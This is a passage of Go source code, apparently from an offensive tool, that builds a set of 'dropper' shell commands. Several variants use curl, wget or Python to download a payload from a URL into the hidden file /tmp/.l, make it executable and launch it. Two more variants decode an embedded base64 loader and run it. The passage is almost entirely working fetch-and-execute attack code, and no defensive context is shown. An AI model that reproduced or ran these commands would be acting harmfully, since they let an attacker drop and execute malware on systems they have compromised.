			`python3 -c "%simport urllib.request,os; opener=urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx)); opener.retrieve('%s','/tmp/.l'); os.chmod('/tmp/.l',0o700)" && /tmp/.l %s`,
			py3TLS, downloadURL, launchArgs)
	}

	return dropperCmds{
		curlCmd: fmt.Sprintf(
			`curl %s '%s' -o /tmp/.l && chmod +x /tmp/.l && /tmp/.l %s`,
			curlFlag, downloadURL, launchArgs),
		wgetCmd: fmt.Sprintf(
			`wget %s /tmp/.l '%s' && chmod +x /tmp/.l && /tmp/.l %s`,
			wgetFlag, downloadURL, launchArgs),
		python3Cmd: py3URLCmd,
		b64Cmd: fmt.Sprintf(
			`printf '%s' | base64 -d > /tmp/.l && chmod +x /tmp/.l && /tmp/.l %s`,
			loaderB64, launchArgs),
		python3B64Cmd: fmt.Sprintf(
			`python3 -c "import base64,os; open('/tmp/.l','wb').write(base64.b64decode('%s')); os.chmod('/tmp/.l',0o700)" && /tmp/.l %s`,
			loaderB64, launchArgs),
	}
}
